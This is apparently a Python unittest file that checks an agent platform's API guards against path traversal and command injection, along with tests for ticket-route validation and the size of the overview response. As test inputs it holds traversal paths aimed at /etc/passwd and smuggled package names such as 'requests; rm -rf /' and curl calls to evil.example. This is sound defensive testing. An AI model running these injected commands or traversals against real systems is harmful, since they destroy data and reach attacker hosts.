"""API 边界负向用例 + ops-overview 首屏瘦身回归。

覆盖两类边界：
  1. 路径穿越/注入：``..``、URL 编码、双重编码、绝对路径、UNC、空字节、
     Windows 保留名、超长路径、模块名穿越；每条必须被结构化错误码拒绝。
  2. 命令注入：分隔符/管道/替换/换行经包名校验闸拒绝（固定 argv 直传，不经 shell）。

另含首屏瘦身回归：概览响应 ≤ 阈值、字段白名单正确、完整记录仍可按需取到。
"""
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(Path(__file__).parent))

from ai_new.modules.agent_common.boot.private._boot import _build as build  # noqa: E402
from ai_new.modules.agent_common.boot.private._context import Context  # noqa: E402
from _fixtures import stage, write_config  # noqa: E402

# 首屏概览响应上限（未压缩字节）：统计条 + 环境信息不该捎带会话原文/工单历史。
OVERVIEW_MAX_BYTES = 300 * 1024


class FakeNet:
    """测试桩：不联网，回一段固定 SSE 形状（编排与编解码都真跑）。"""

    def __call__(self, ctx, payload):
        return {"ok": True, "status": 200, "headers": {},
                "items": [{"choices": [{"delta": {"content": "（测试）已完成。"},
                                        "finish_reason": "stop"}]}]}


class ApiBoundaryTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        root = Path(cls.tmp.name)
        stage(root)
        write_config(root, {
            "server": {"host": "127.0.0.1", "port": 0, "token": "t"},
            "llm": {"base_url": "http://stub.local/v1", "api_key": "k", "model": "stub"},
            "tickets": {"stall_check": {"enabled": False}},
        })
        os.environ["AI_NEW_DATA"] = str(root)
        cls.ctx = Context(root)
        cls.loaded = build(cls.ctx)
        cls.ctx.api.substitute("net.request", FakeNet())
        cls.ctx.api.substitute("net.request_stream", FakeNet())

    @classmethod
    def tearDownClass(cls):
        http = getattr(cls.ctx, "http", None)
        if http is not None:
            http.shutdown()
        os.environ.pop("AI_NEW_DATA", None)
        shutil.rmtree(cls.tmp.name, ignore_errors=True)

    # ---- 工具 ----

    def _read_denied(self, path, module="agent/logs"):
        with self.assertRaises(self.ctx.ApiError) as caught:
            self.ctx.api.call("store.read", {"module": module, "path": path},
                              caller=None, direct=True)
        return caught.exception

    def _exec_denied(self, route, payload):
        with self.assertRaises(self.ctx.ApiError) as caught:
            self.ctx.api.call(route, payload, caller=None, direct=True)
        return caught.exception

    # ---- 工单路由校验分支：坏形状必须在写之前结构化拒绝 ----

    def _ticket(self, route, payload):
        out = self.ctx.api.call(route, payload, caller=None, direct=True)
        return out

    def test_ticket_send_guards(self):
        """缺单/空正文/非文本正文/未知目标都必须给出明确错误码。"""
        self.assertEqual(self._ticket("tickets.send", {"id": "T-none", "text": "x"}).get("code"), "not_found")
        self.assertEqual(self._ticket("tickets.send", {"id": "T-none", "text": "  "}).get("code"), "empty_text")
        self.assertEqual(self._ticket("tickets.send", {"id": "T-none", "text": 1}).get("code"), "bad_input")

    def test_ticket_note_guards(self):
        """备注走同一套守卫：缺单先 404；真实单据上空正文/非文本再 400。"""
        self.assertEqual(self._ticket("tickets.note_write", {"id": "T-none", "text": "x"}).get("code"), "not_found")
        pid = "dbg-1795512827"
        tid = "T-guard-note"
        rec = self._ticket("tickets.build", {"id": tid, "title": "guard", "project": pid,
                                             "kind": "sub",
                                             "now": self._ticket("clock.now", {}).get("ts")})
        path = self._ticket("tickets.record_path", {"id": tid, "project": pid}).get("path")
        self._ticket("store.write", {"module": "agent/tickets", "path": path, "value": rec})
        self.assertEqual(self._ticket("tickets.note_write", {"id": tid, "text": ""}).get("code"), "empty_text")
        self.assertEqual(self._ticket("tickets.note_write", {"id": tid, "text": {}}).get("code"), "bad_input")

    def test_ticket_split_guards(self):
        """children 非列表/元素非对象/上限非整数/force 非布尔都必须 400。"""
        self.assertEqual(self._ticket("tickets.split", {"id": "T-none", "children": "x"}).get("code"), "bad_input")
        self.assertEqual(self._ticket("tickets.split", {"id": "T-none", "children": ["x"]}).get("code"), "bad_input")
        self.assertEqual(self._ticket("tickets.split", {"id": "T-none", "children": [],
                                                         "max_children": "8"}).get("code"), "bad_input")
        self.assertEqual(self._ticket("tickets.split", {"id": "T-none", "children": [],
                                                         "force": "yes"}).get("code"), "bad_input")

    def test_ticket_split_reads_global_limit_when_omitted(self):
        """直调能力不传 max_children 时也要回读 config，不能绕过全局上限。"""
        pid, tid = "dbg-1795512827", "T-guard-split"
        now = self._ticket("clock.now", {}).get("ts")
        rec = self._ticket("tickets.build", {"id": tid, "title": "split", "project": pid,
                                             "kind": "parent", "now": now})
        for i in range(8):
            rec = self._ticket("tickets.bindchild", {
                "rec": rec, "child": "T-child-%d" % i, "tpl": "", "now": now})
        path = self._ticket("tickets.record_path", {"id": tid, "project": pid}).get("path")
        self._ticket("store.write", {"module": "agent/tickets", "path": path, "value": rec})
        out = self._ticket("tickets.split", {"id": tid, "children": [{"title": "x"}]})
        self.assertEqual(out.get("code"), "too_many_children", out)

    def test_ticket_rebind_guards(self):
        """from/to 必须非空字符串且不相同，避免把 project 写成对象或原地打转。"""
        for payload in ({"from": "", "to": "p2"}, {"from": "p1", "to": []},
                        {"from": "p1", "to": "p1"}):
            self.assertEqual(self._ticket("tickets.rebind", payload).get("code"), "bad_input")

    def test_project_create_empty_name_guard(self):
        """空项目名必须在 store.id 之前拒绝，不能生成 item 这种假项目。"""
        out = self.ctx.api.call("projects.create", {"name": "   "}, caller=None, direct=True)
        self.assertEqual(out.get("code"), "missing_name")

    def test_ticket_create_and_close_guards(self):
        """建单缺项目/结单缺单都必须结构化拒绝。"""
        out = self._ticket("tickets.create", {"title": "x"})
        self.assertEqual(out.get("code"), "missing_project")
        out = self._ticket("tickets.close", {"id": "T-none"})
        self.assertEqual(out.get("code"), "not_found")

    # ---- 路径穿越：每条一个断言 + 明确错误码 ----

    def test_dotdot_traversal_rejected(self):
        exc = self._read_denied("../../etc/passwd")
        self.assertEqual(exc.code, "traversal")

    def test_url_encoded_traversal_rejected(self):
        exc = self._read_denied("%2e%2e/%2e%2e/etc/passwd")
        self.assertEqual(exc.code, "traversal")

    def test_double_encoded_traversal_rejected(self):
        exc = self._read_denied("%252e%252e/%252e%252e/etc/passwd")
        self.assertEqual(exc.code, "traversal")

    def test_absolute_posix_path_rejected(self):
        exc = self._read_denied("/etc/passwd")
        self.assertEqual(exc.code, "abs_path")

    def test_unc_path_rejected(self):
        exc = self._read_denied("\\\\server\\share\\secret.yaml")
        self.assertEqual(exc.code, "abs_path")

    def test_null_byte_rejected(self):
        exc = self._read_denied("safe\x00.yaml")
        self.assertEqual(exc.code, "null_byte")

    def test_windows_reserved_names_rejected(self):
        for name in ("CON", "PRN", "AUX", "NUL", "COM1", "LPT1"):
            exc = self._read_denied(name + ".yaml")
            self.assertEqual(exc.code, "reserved_name", name)

    def test_overlong_path_rejected(self):
        exc = self._read_denied("x" * 1100 + ".yaml")
        self.assertEqual(exc.code, "path_too_long")

    def test_module_traversal_rejected(self):
        exc = self._exec_denied("store.read",
                                {"module": "../../etc", "path": "passwd"})
        self.assertEqual(exc.code, "traversal")

    def test_write_and_glob_guard_share_same_boundary(self):
        """写/glob 入口走同一道闸：穿越片段不许落到文件 IO。"""
        exc = self._exec_denied("store.write",
                                {"module": "agent/logs", "path": "../escape.yaml",
                                 "value": {}})
        self.assertEqual(exc.code, "traversal")
        exc = self._exec_denied("store.glob",
                                {"module": "agent/logs", "root": "../.."})
        self.assertEqual(exc.code, "traversal")

    # ---- 命令注入：包名校验闸（固定 argv 直传，不经 shell）----

    def _pip_install(self, pkg):
        return self.ctx.api.call("tools.execute",
                                 {"name": "pip_install", "args": {"pkg": pkg}},
                                 caller=None, direct=True)

    def test_command_semicolon_rejected(self):
        res = self._pip_install("requests; rm -rf /")
        self.assertFalse(res["ok"])
        self.assertEqual(res["code"], "bad_pkg")

    def test_command_and_and_rejected(self):
        res = self._pip_install("requests && curl evil.example")
        self.assertFalse(res["ok"])
        self.assertEqual(res["code"], "bad_pkg")

    def test_command_pipe_rejected(self):
        res = self._pip_install("requests | grep x")
        self.assertFalse(res["ok"])
        self.assertEqual(res["code"], "bad_pkg")

    def test_command_backtick_rejected(self):
        res = self._pip_install("`echo injected`")
        self.assertFalse(res["ok"])
        self.assertEqual(res["code"], "bad_pkg")

    def test_command_dollar_paren_rejected(self):
        res = self._pip_install("$(echo injected)")
        self.assertFalse(res["ok"])
        self.assertEqual(res["code"], "bad_pkg")

    def test_command_newline_rejected(self):
        res = self._pip_install("requests\ncurl evil.example")
        self.assertFalse(res["ok"])
        self.assertEqual(res["code"], "bad_pkg")

    def test_legit_package_name_passes_validator(self):
        """对照：合法包名不被闸误伤（白名单不是一刀切拒绝）。"""
        res = self._pip_install("requests==2.31.0")
        # 校验通过后才会起 pip；桩环境装不上只回安装失败，不该是 bad_pkg。
        self.assertNotEqual(res.get("code"), "bad_pkg")


class OverviewSlimTest(unittest.TestCase):
    """首屏瘦身回归：字节上限、字段白名单、按需接口仍能取全量。"""

    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        root = Path(cls.tmp.name)
        stage(root)
        write_config(root, {
            "server": {"host": "127.0.0.1", "port": 0, "token": "t"},
            "llm": {"base_url": "http://stub.local/v1", "api_key": "k", "model": "stub"},
            "tickets": {"stall_check": {"enabled": False}},
        })
        os.environ["AI_NEW_DATA"] = str(root)
        cls.ctx = Context(root)
        cls.loaded = build(cls.ctx)
        cls.ctx.api.substitute("net.request", FakeNet())
        cls.ctx.api.substitute("net.request_stream", FakeNet())
        cls.out = cls.ctx.api.call("demand_engine.run",
                                   {"id": "ops-overview", "input": {}})
        cls.overview = cls.out["result"]

    @classmethod
    def tearDownClass(cls):
        http = getattr(cls.ctx, "http", None)
        if http is not None:
            http.shutdown()
        os.environ.pop("AI_NEW_DATA", None)
        shutil.rmtree(cls.tmp.name, ignore_errors=True)

    def test_overview_response_within_size_budget(self):
        raw = self.ctx.codec.yaml_encode_flow(self.out)["text"].encode("utf-8")
        self.assertLessEqual(len(raw), OVERVIEW_MAX_BYTES,
                             "首屏概览 %d 字节超出 %d 上限" % (len(raw), OVERVIEW_MAX_BYTES))

    def test_overview_source_keys_are_whitelisted(self):
        self.assertEqual(set(self.overview.keys()),
                         {"config", "sessions", "tickets", "knowledge", "artifacts",
                          "library", "projects", "tools", "docs"})

    def test_session_brief_drops_transcript_fields(self):
        items = self.overview["sessions"]["result"]["items"]
        leaked = {"messages", "meta", "machine", "todos"}
        for row in items:
            self.assertFalse(leaked & set(row), "会话首屏漏出明细字段: %s" % (leaked & set(row)))

    def test_ticket_brief_drops_history_fields(self):
        items = self.overview["tickets"]["result"]["items"]
        leaked = {"goal", "history", "roles", "children", "verdict", "summary"}
        for row in items:
            self.assertFalse(leaked & set(row), "工单首屏漏出明细字段: %s" % (leaked & set(row)))

    def test_full_session_records_still_available_on_demand(self):
        """完整数据没被删：按会话清单按需接口仍能取回消息原文。"""
        full = self.ctx.api.call("demand_engine.run",
                                 {"id": "session-list", "input": {}})["result"]
        items = full.get("items") or []
        if items:
            self.assertIn("messages", items[0], "按需会话清单丢了消息原文")

    def test_metric_sources_present(self):
        """统计条取数源都在概览回包里（gate_ops 核对的根不许缺）。"""
        for src in ("projects", "tickets", "sessions", "artifacts", "docs",
                    "knowledge", "tools", "library"):
            self.assertIn(src, self.overview)


if __name__ == "__main__":
    unittest.main()
